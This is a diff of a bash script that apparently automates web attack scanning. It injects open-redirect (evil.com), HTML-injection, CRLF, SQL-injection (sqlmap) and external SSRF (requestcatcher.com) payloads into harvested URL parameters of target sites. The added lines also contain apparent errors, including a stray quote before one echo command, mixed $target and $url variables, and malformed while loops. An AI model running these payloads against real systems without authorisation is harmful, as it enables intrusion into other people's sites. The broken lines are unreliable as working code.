@@ -104,14 +104,14 @@ cat $target/recon/final-urls.txt | wc -l
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Fuzzing For Open Redirects----------------------------------------
 #--------------------------------------------------------------------------------------------------
-echo "[+]Fuzzing For Openredirects" 
-cat $target/recon/final-params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ;done >> $target/open-redirects.txt
+echo "[+]Fuzzing For Openredirects...." 
+cat $target/recon/final-params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ; done >> $target/open-redirects.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For HTMLi Injection---------------------------------------
 #--------------------------------------------------------------------------------------------------
-echo "[+]Testing For HTML Injection...." 
-cat $url/recon/final_params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host"; done > $url/htmli.txt
-rm $url/recon/temp.txt
+echo "[+]Fuzzing For HTML Injection...." 
+cat $target/recon/final-params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/htmli-test.txt && cat $url/recon/htmli-test.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host" ; done >> $url/htmli.txt
+rm $url/recon/htmli-test.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For XSS Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
@@ -125,17 +125,17 @@ rm $url/recon/temp.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For CRLF Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
-echo "[+]Testing For CRLF Injection...." 
-crlfuzz -l $url/recon/final_params.txt -o $url/crlf_vuln.txt -s 
+'echo "[+]Testing For CRLF Injection...." 
+crlfuzz -l $target/recon/final_params.txt -o $url/crlf_vuln.txt -s 
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For SQL Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Testing For SQL Injection...." 
-cat $url/recon/final_params.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2
+cat $target/recon/final_params.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2 
 #--------------------------------------------------------------------------------------------------
 #-----------------------------------Checking For SSRF----------------------------------------------
 #--------------------------------------------------------------------------------------------------
-echo "[+]Testing For External SSRF.........." 
+echo "[+]Fuzzing For External SSRF.........." 
 cat $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/eSSRF.txt
 rm $url/recon/ssrftest.txt
 #--------------------------------------------------------------------------------------------------
